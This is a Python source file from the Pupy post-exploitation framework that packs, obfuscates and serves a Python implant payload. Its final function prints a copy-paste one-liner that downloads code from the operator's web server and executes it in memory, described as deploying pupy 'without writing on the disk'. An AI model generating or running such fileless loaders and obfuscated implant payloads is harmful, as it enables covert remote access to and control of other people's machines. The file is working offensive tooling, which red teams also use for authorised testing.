#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import re
import os.path

from pupylib.PupyOutput import Success, Warn, Error, List
from pupylib.utils.obfuscate import compress_encode_obfs
from pupylib.payloads import dependencies
from pupylib import ROOT


def getLinuxImportedModules():
    '''
    '''
    lines = ""
    with open(os.path.join(ROOT, "conf", "imports_done.py")) as f:
        lines = f.read()
    return lines

def pack_py_payload(display, conf, debug=False):
    display(Success('Generating PY payload ...'))
    fullpayload = []

    with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
        pupyimportercode = f.read()

    fullpayload.append(
        '\n'.join([
            dependencies.loader(pupyimportercode, 'pupyimporter'),
            'import pupyimporter',
            'pupyimporter.install(debug={})'.format(repr(debug if debug is not None else False)),
            dependencies.importer('network', path=ROOT),
            dependencies.importer((
                'rpyc', 'pyasn1', 'rsa',
                'netaddr', 'tinyec', 'umsgpack',
                'poster', 'win_inet_pton'))
        ]) + '\n'
    )

    with open(os.path.join(ROOT, 'pp.py')) as f:
        code = f.read()

    code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)

    if debug:
        fullpayload = [
            'import logging',
            'logging.basicConfig()',
            'logging.getLogger().setLevel(logging.DEBUG)'
        ] + fullpayload

    fullpayload.append(code+'\n')

    payload = '\n'.join(fullpayload) + '\n'

    if debug:
        return payload

    return compress_encode_obfs(payload, main=True)


def serve_payload(display, server, payload, link_ip="<your_ip>"):
    if not server:
        display(Error('Oneliners only supported from pupysh'))
        return

    if not server.pupweb:
        display(Error('Webserver disabled'))
        return

    landing_uri = server.pupweb.serve_content(payload, alias='py payload')

    display(Warn('Python 2.7.x required, x should be >= 9'))

    display(List([
        "python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s%s\").read()'"%(
            link_ip, server.pupweb.port, landing_uri),
    ], caption=Success(
        'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
